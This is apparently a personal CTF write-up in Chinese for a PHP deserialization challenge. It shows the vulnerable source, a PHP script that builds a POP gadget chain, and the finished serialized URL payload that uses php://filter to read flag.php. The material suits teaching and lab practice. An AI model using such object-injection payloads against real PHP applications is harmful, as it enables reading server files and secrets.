![[Pasted image 20221129094955.png|500]]

---
首页长这样
```php
<?php
//flag is in flag.php
//WTF IS THIS?
//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95
//And Crack It!
class Modifier {
    protected  $var;
    public function append($value){
        include($value);
    }
    public function __invoke(){
        $this->append($this->var);
    }
}

class Show{
    public $source;
    public $str;
    public function __construct($file='index.php'){
        $this->source = $file;
        echo 'Welcome to '.$this->source."<br>";
    }
    public function __toString(){
        return $this->str->source;
    }

    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}

class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }

    public function __get($key){
        $function = $this->p;
        return $function();
    }
}

if(isset($_GET['pop'])){
    @unserialize($_GET['pop']);
}
else{
    $a=new Show;
    highlight_file(__FILE__);
}
```

经典的反序列化
```php
class Modifier {
    protected  $var = "php://filter/read=convert.base64-encode/resource=flag.php";
}

class Show{
    public $source;
    public $str;
}

class Test{
    public $p;
}

$s = new Show;
$ss = new Show;
$s->source = $ss;
$ss->str = new Test;
$ss->str->p = new Modifier;
echo serialize($s);
```

```php
/?pop=O:4:"Show":2:{s:6:"source";O:4:"Show":2:{s:6:"source";s:9:"index.php";s:3:"str";O:4:"Test":1:{s:1:"p";O:8:"Modifier":1:{s:6:"%00*%00var";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";}}}s:3:"str";N;}
```

![[Pasted image 20221129110811.png]]

![[Pasted image 20221129110830.png]]

#Web #PHP #反序列化 